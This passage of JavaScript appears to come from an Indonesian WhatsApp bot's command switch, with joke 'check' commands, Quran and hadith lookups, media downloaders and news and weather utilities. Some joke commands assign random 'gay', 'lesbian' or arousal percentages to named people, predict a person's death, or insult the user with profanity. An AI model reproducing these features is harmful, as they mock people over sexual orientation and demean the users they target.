                if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
                const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
                const teng = gan[Math.floor(Math.random() * gan.length)]
                newReply(`Nama : ${q}\nJawaban : *${teng}%`)
                }
            break
                
            case 'cantikcek':
            case 'cekcantik': {
                if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Akame`)
                const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
                const tik = can[Math.floor(Math.random() * can.length)]
                newReply(`Nama : ${q}\nJawaban : *${tik}%`)
                }
            break
            
            case 'sangecek':
            case 'ceksange':
            case 'gaycek':
            case 'cekgay':
            case 'lesbicek':
            case 'ceklesbi': {
                if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
                const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
                newReply(`Nama : ${q}\nJawaban : *${sange}%*`)
                }
            break
                
            case 'kapankah': {
                if (!q) return newReply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
                const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
                const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
                newReply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
                }
            break
            
            case 'wangy': {
                if (!q) return newReply(`Contoh : .wangy Riy`)
                qq = q.toUpperCase()
                awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
                newReply(awikwok)
                }
            break
            
            case 'cekmati': {
                if (!q) return newReply(`Invalid!\n\nYg mau di cek siapa kontol?`)
                predea = await axios.get(`https://api.agify.io/?name=${q}`)
                newReply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
                }
            break
            
            case 'halah':
            case 'hilih':
            case 'huluh':
            case 'heleh':
            case 'holoh': {
                if (!m.quoted && !text) return newReply(`Kirim/reply text dengan caption ${prefix + command}`)
                ter = command[1].toLowerCase()
                tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
                newReply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
                }
            break
            
        // ISLAMIN FITUR
            case 'iqra': {
                oh = `Contoh : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
                if (!text) return newReply(oh)
                yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
                conn.sendMessage(m.chat, {
                    document: yy,
                    mimetype: 'application/pdf',
                    fileName: `iqra${text}.pdf`
                }, {
                    quoted: m
                }).catch((err) => newReply(oh))
            }
            break
            case 'juzamma': {
                if (args[0] === 'pdf') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'
                        },
                        mimetype: 'application/pdf',
                        fileName: 'juz-amma-arab-latin-indonesia.pdf'
                    }, {
                        quoted: m
                    })
                } else if (args[0] === 'docx') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'
                        },
                        mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                        fileName: 'juz-amma-arab-latin-indonesia.docx'
                    }, {
                        quoted: m
                    })
                } else if (args[0] === 'pptx') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'
                        },
                        mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                        fileName: 'juz-amma-arab-latin-indonesia.pptx'
                    }, {
                        quoted: m
                    })
                } else if (args[0] === 'xlsx') {
                    newReply(mess.wait)
                    conn.sendMessage(m.chat, {
                        document: {
                            url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'
                        },
                        mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                        fileName: 'juz-amma-arab-latin-indonesia.xlsx'
                    }, {
                        quoted: m
                    })
                } else {
                    newReply(`Mau format apa ? Contoh : ${prefix + command} pdf\nFormat yang tersedia : pdf, docx, pptx, xlsx`)
                }
            }
            break
            case 'hadis':
            case 'hadist': {
                if (!args[0]) return newReply(`Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`)
                if (!args[1]) return `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
                try {
                    let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
                    let {
                        number,
                        arab,
                        id
                    } = res.find(v => v.number == args[1])
                    newReply(`No. ${number}

${arab}

${id}`)
                } catch (e) {
                    newReply(`Hadis tidak ditemukan !`)
                }
            }
            break
            case 'tafsirsurah': {
                if (!args[0]) return `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
                if (!args[1]) return `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
                let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
                let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
                newReply(txt)
            }
            break
            // Islami Fitur
            case 'asmaulhusna':
            newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${apikey}`)
				.then(({ data }) => {
					var text = `No : ${data.result.index}\n`
					text += `Latin: ${data.result.latin}\n`
					text += `Arab : ${data.result.ar}\n`
					text += `Indonesia : ${data.result.id}\n`
					text += `English : ${data.result.en}`
					newReply(text)
				})
				.catch(console.error)
			break
			
			case 'alquranaudio': {
                if (args.length == 0) return newReply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
                newReply(mess.wait)
                conn.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${args[0]}?apikey=${apikey}`}, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
            }
            break
            
            case 'alquran':
			if (args.length < 1) return newReply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
			newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${apikey}`)
				.then(({ data }) => {
					var ayat = data.result.ayat
					var text = `QS. ${data.result.surah} : 1-${ayat.length}\n\n`
					for (var x of ayat) {
						text += `${x.arab}\n${x.ayat}. ${x.latin}\n${x.indonesia}\n\n`
					}
					text = text.replace(/<u>/g, '_').replace(/<\/u>/g, '_')
					text = text.replace(/<strong>/g, '*').replace(/<\/strong>/g, '*')
					newReply(text)
				})
				.catch(console.error)
            break
            
			case 'jadwalsolat': {
            if (!text) return newReply('Mana Kotanya?')
            newReply(mess.wait)
            let anu = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${text}?apikey=${apikey}`)
            newReply(`Wilayah: ${anu.result.wilayah}\n\nTanggal: ${anu.result.tanggal}\nSahur: ${anu.result.sahur}\nImsak: ${anu.result.imsak}\nTerbit: ${anu.result.terbit}\nDhuha: ${anu.result.dhuha}\nDzuhur: ${anu.result.dzuhur}\nAshar: ${anu.result.ashar}\nMagrib: ${anu.result.maghrib}\nIsya: ${anu.result.isya}`)
            }
            break
            
            case 'kisahnabi':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Muhammad`)
			newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/kisahnabi/${full_args}?apikey=${apikey}`)
				.then(({ data }) => {
					var text = `Name : ${data.result.name}\n`
					text += `Lahir : ${data.result.thn_kelahiran}\n`
					text += `Umur : ${data.result.age}\n`
					text += `Tempat : ${data.result.place}\n`
					text += `Story : \n${data.result.story}`
					newReply(text)
				})
				.catch(console.error)
			break
			
            case 'listsurah':
            newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/quran?apikey=${apikey}`)
				.then(({ data }) => {
					var text = 'List Surah:\n'
					for (var x in data.result) {
						text += `${x}. ${data.result[x]}\n`
					}
					newReply(text)
				})
				.catch(console.error)
			break
			
			// DOWNLOADER FITUR
			case 'git': case 'gitclone': {
                if (!args[0]) return newReply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/YukiShima4/tes`)
                if (!isUrl(args[0]) && !args[0].includes('github.com')) return newReply(`Link invalid!!`)
                let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
                let [, user, repo] = args[0].match(regex1) || []
                repo = repo.replace(/.git$/, '')
                let url = `https://api.github.com/repos/${user}/${repo}/zipball`
                let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
                conn.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
            }       
            break
			case 'ytplay':
			if (args.length == 0) return await newReply(`Example: ${prefix + command} melukis senja`)
			newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${full_args}`)
				.then(({ data }) => {
					axios.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=https://www.youtube.com/watch?v=${data.result[0].videoId}`).then(({ data }) => {
						var caption = `❖ Title    : *${data.result.title}*\n`
						caption += `❖ Size     : *${data.result.size}*`
						conn.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption }).then(() => {
							conn.sendMessage(m.chat, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
						})
					})
				})
				.catch(console.error)
			break
			
			case 'ytmp3':
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
			newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
					var caption = `❖ Title    : *${data.result.title}*\n`
					caption += `❖ Size     : *${data.result.size}*`
					conn.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption }).then(() => {
						conn.sendMessage(m.chat, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
					})
				})
				.catch(console.error)
			break
			
		    case 'ytmp4':
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
			newReply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/ytvideo2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
					var caption = `❖ Title    : *${data.result.title}*\n`
					caption += `❖ Size     : *${data.result.size}*`
					conn.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption }).then(() => {
						conn.sendMessage(m.chat, { video: { url: data.result.link }, mimetype: 'video/mp4', fileName: `${data.result.title}.mp4` })
					})
				})
				.catch(console.error)
			break
			
			case 'tiktok': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				conn.sendMessage(m.chat, { video: { url: data.result.link }, mimetype: 'video/mp4' })
			})
			
			}
			break
			
			case 'tiktokaudio': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
			newReply(mess.wait)
			conn.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/tiktokmusic?apikey=${apikey}&url=${args[0]}` }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
			
			}
			break
			
			case 'igdl': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				var url = data.result[0]
				if (url.includes('.mp4')) {
					conn.sendMessage(m.chat, { video: { url }, mimetype: 'video/mp4' })
				} else {
					conn.sendMessage(m.chat, { image: { url } })
				}
			})
			
            }
			break
			
		    case 'igdl2': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/instagram2?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				for (var x of data.result) {
					if (x.includes('.mp4')) {
						conn.sendMessage(m.chat, { video: { url: x }, mimetype: 'video/mp4' })
					} else {
						conn.sendMessage(m.chat, { image: { url: x } })
					}
				}
			})
			
			}
			break
			
			case 'twtdl': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/twitter?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				conn.sendMessage(m.chat, { video: { url: data.result.link[data.result.link.length - 1].link }, mimetype: 'video/mp4' })
			})
			
			}
			break
			
		    case 'fbdl': {
			if (args.length == 0) return newReply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
			newReply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				conn.sendMessage(m.chat, { video: { url: data.result }, mimetype: 'video/mp4' })
			})
			
			}
			break
			
			// Tools Fitur
			case 'style':
            case 'styletext': {
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let {
                    styletext
                } = require('./lib/scraper')
                if (!text) return newReply('Masukkan Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `🖋️ *${i.name}* : ${i.result}\n\n`
                }
                newReply(teks)
            }
            break
            
            case 'hapus': 
            case 'delete': 
            case 'del': 
            case 'd': {
                if (!m.quoted) return false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return newReply('Pesan tersebut bukan dikirim oleh bot!')
                conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            
            case 'q':
            case 'quoted': {
                if (!m.quoted) return newReply('Reply Pesannya!!')
                let wokwol = await conn.serializeM(await m.getQuotedObj())
                if (!wokwol.quoted) return newReply('Pesan Yang Anda Reply Tidak Mengandung Reply')
                await wokwol.quoted.copyNForward(m.chat, true)
            }
            break
            
            case 'ebinary': {
                let {
                    eBinary
                } = require('./lib/binary')
                let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
                let eb = await eBinary(teks)
                newReply(eb)
            }
            break
            case 'dbinary': {
                let {
                    dBinary
                } = require('./lib/binary')
                let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
                let db = await dBinary(teks)
                newReply(db)
            }
            break
            
            
		
            // Information Fitur
            case 'pinterest': {
                if (!text) return newReply(`Example : ${prefix + command}`)
                newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
		        let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done}, { quoted: m })
            }
            break
            
            case 'google': {
                if (!text) return newReply(`Contoh : ${prefix + command} fatih arridho`)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `• *Title* : ${g.title}\n`
                teks += `• *Description* : ${g.snippet}\n`
                teks += `• *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                newReply(teks)
                })
                }
            break
            
            case 'gimage': {
                if (!text) return newReply(`Contoh : ${prefix + command} FallZx`)
                newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let gis = require('g-i-s')
                gis(text, async (error, result) => {
                    n = result
                    images = n[Math.floor(Math.random() * n.length)].url
                    conn.sendMessage(m.chat, { image: { url: images}, caption: `*-------「 GIMAGE SEARCH 」-------*\n🤠 *Query* : ${text}\n🔗 *Media Url* : ${images}`}, { quoted: m })
                })
            }
            break
            case 'infochat': {
                if (!m.quoted) newReply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) return newReply('Pesan tersebut bukan dikirim oleh bot!')
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `👤 @${i.userJid.split('@')[0]}\n`
                    teks += `⏳ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')}\n📈 *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                newReply(teks)
            }
            break
            
            case 'kbbi':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} kursi`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/kbbi?apikey=${apikey}&query=${full_args}`)
			var titid = `\`\`\`Kata : ${data.result[0].nama}\`\`\`\n`
			titid += `\`\`\`Kata Dasar : ${data.result[0].kata_dasar}\`\`\`\n`
			titid += `\`\`\`Pelafalan : ${data.result[0].pelafalan}\`\`\`\n`
			titid += `\`\`\`Bentuk Tidak Baku : ${data.result[0].bentuk_tidak_baku}\`\`\`\n\n`
			for (var x of data.result) {
				titid += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
				titid += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
				titid += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
				titid += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
				titid += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
			}
			newReply(titid)
			}
			break
		case 'brainly':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} siapakah sukarno`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/brainly?apikey=${apikey}&query=${full_args}`)
			var ti  = 'Beberapa Pembahasan Dari Brainly :\n\n'
			for (var x of data.result) {
				ti  += `==============================\n`
				ti  += `\`\`\`Pertanyaan :\`\`\`\n${x.question.content}\n\n`
				ti  += `\`\`\`Jawaban :\`\`\`\n${x.answer[0].content}\n`
				ti  += `==============================\n\n`
			}
			newReply(ti )
			}
			break
		    case 'roboguru':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} siapakah sukarno`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/roboguru?apikey=${apikey}&query=${full_args}&grade=sma&subject=sejarah`).catch((err) => console.error(err?.response?.data))
			var tit = 'Beberapa Pembahasan Dari Roboguru :\n\n'
			for (var x of data.result) {
				tit += `==============================\n`
				tit += `\`\`\`Pertanyaan :\`\`\`\n${x.question}\n\n`
				tit += `\`\`\`Jawaban :\`\`\`\n${x.answer}\n`
				tit += `==============================\n\n`
			}
			newReply(tit)
			}
			break
			
		    case 'jarak':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} jakarta - yogyakarta`)
			var titt1 = full_args.split('-')[0].trim()
			var titt2 = full_args.split('-')[1].trim()
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${apikey}&kota1=${titt1}&kota2=${titt2}`)
			var titt = `Informasi Jarak dari ${titt1} ke ${titt2} :\n\n`
			titt += `\`\`\`◪ Asal :\`\`\` ${data.result.from.name}\n`
			titt += `\`\`\`◪ Garis Lintang :\`\`\` ${data.result.from.latitude}\n`
			titt += `\`\`\`◪ Garis Bujur :\`\`\` ${data.result.from.longitude}\n\n`
			titt += `\`\`\`◪ Tujuan :\`\`\` ${data.result.to.name}\n`
			titt += `\`\`\`◪ Garis Lintang :\`\`\` ${data.result.to.latitude}\n`
			titt += `\`\`\`◪ Garis Bujur :\`\`\` ${data.result.to.longitude}\n\n`
			titt += `\`\`\`◪ Jarak Tempuh :\`\`\` ${data.result.jarak}\n`
			titt += `\`\`\`◪ Waktu Tempuh :\`\`\`\n`
			titt += `   ╭───────────────❏\n`
			titt += `❍┤ Kereta Api : ${data.result.kereta_api}\n`
			titt += `❍┤ Pesawat : ${data.result.pesawat}\n`
			titt += `❍┤ Mobil : ${data.result.mobil}\n`
			titt += `❍┤ Motor : ${data.result.motor}\n`
			titt += `❍┤ Jalan Kaki : ${data.result.jalan_kaki}\n`
			titt += `   ╰───────────────❏\n`
			newReply(titt)
			}
			break
			
			case 'wikipedia':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Tahu`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/wiki?apikey=${apikey}&query=${full_args}`)
			newReply(data.result)
			break
			
		    case 'translate':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} en Tahu Bacem`)
			newReply(mess.wait)
			var kode_negara = args[0]
			args.shift()
			var tittt = args.join(' ')
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/translate/auto/${kode_negara}?apikey=${apikey}&text=${tittt}`)
			init_txt = `From : ${data.result.from}\n`
			init_txt += `To : ${data.result.to}\n`
			init_txt += `Original : ${data.result.original}\n`
			init_txt += `Translated : ${data.result.translated}\n`
			init_txt += `Pronunciation : ${data.result.pronunciation}\n`
			newReply(init_txt)
			}
			break
			
		    case 'jadwaltv':
			if (args.length == 0) return newReply(`Example: ${prefix + command} RCTI`)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/${args[0]}?apikey=${apikey}`)
			newReply(mess.wait)
			var titttt = `Jadwal TV ${args[0].toUpperCase()}\n`
			for (var x in data.result) {
				titttt += `${x} - ${data.result[x]}\n`
			}
			newReply(titttt)
			break
			
		    case 'jadwaltvnow':
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${apikey}`)
			newReply(mess.wait)
			var tittttt = `Jadwal TV Now :\n`
			for (var x in data.result) {
				tittttt += `${x.toUpperCase()}${data.result[x]}\n\n`
			}
			newReply(tittttt)
			break
			
		    case 'newsinfo':{
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/newsinfo?apikey=${apikey}`)
			newReply(mess.wait)
			var titttttt = 'Result :\n'
			for (var x of data.result) {
				titttttt += `Title : ${x.title}\n`
				titttttt += `Author : ${x.author}\n`
				titttttt += `Source : ${x.source.name}\n`
				titttttt += `Url : ${x.url}\n`
				titttttt += `Published : ${x.publishedAt}\n`
				titttttt += `Description : ${x.description}\n\n`
			}
			newReply(titttttt)
			}
			break
			
		    case 'cnnindonesia':{
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia?apikey=${apikey}`)
			newReply(mess.wait)
			var tittttttt = 'Result :\n'
			for (var x of data.result) {
				tittttttt += `Judul : ${x.judul}\n`
				tittttttt += `Link : ${x.link}\n`
				tittttttt += `Tipe : ${x.tipe}\n`
				tittttttt += `Published : ${x.waktu}\n\n`
			}
			newReply(tittttttt)
			}
			break
			
		    case 'cnnnasional':{
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=${apikey}`)
			newReply(mess.wait)
			var titttttttt = 'Result :\n'
			for (var x of data.result) {
				titttttttt += `Judul : ${x.judul}\n`
				titttttttt += `Link : ${x.link}\n`
				titttttttt += `Tipe : ${x.tipe}\n`
				titttttttt += `Published : ${x.waktu}\n\n`
			}
			newReply(titttttttt)
			}
			break
			
		    case 'cnninternasional':{
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=${apikey}`)
			newReply(mess.wait)
			var tittttttttt = 'Result :\n'
			for (var x of data.result) {
				tittttttttt += `Judul : ${x.judul}\n`
				tittttttttt += `Link : ${x.link}\n`
				tittttttttt += `Tipe : ${x.tipe}\n`
				tittttttttt += `Published : ${x.waktu}\n\n`
			}
			newReply(tittttttttt)
			}
			break
			
		    case 'infogempa':
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/infogempa?apikey=${apikey}`)
			newReply(mess.wait)
			var caption = `Lokasi : ${data.result.lokasi}\n`
			caption += `Waktu : ${data.result.waktu}\n`
			caption += `Potensi : ${data.result.potensi}\n`
			caption += `Magnitude : ${data.result.magnitude}\n`
			caption += `Kedalaman : ${data.result.kedalaman}\n`
			caption += `Koordinat : ${data.result.koordinat}`
			conn.sendMessage(m.chat, { image: { url: data.result.map }, caption })
			break
			
		    case 'lirik':
			if (args.length == 0) return newReply(`Example: ${prefix + command} Melukis Senja`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/lirik?apikey=${apikey}&query=${full_args}`)
			newReply(data.result)
			break
			
		    case 'infocuaca':{
			if (args.length == 0) return newReply(`Example: ${prefix + command} Yogyakarta`)
			newReply(mess.wait)
			var { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${args[0]}?apikey=${apikey}`)
			var titttttttttt = `Tempat : ${data.result.tempat}\n`
			titttttttttt += `Cuaca : ${data.result.cuaca}\n`
			titttttttttt += `Angin : ${data.result.angin}\n`
			titttttttttt += `Description : ${data.result.description}\n`
			titttttttttt += `Kelembapan : ${data.result.kelembapan}\n`
			titttttttttt += `Suhu : ${data.result.suhu}\n`
			titttttttttt += `Udara : ${data.result.udara}\n`
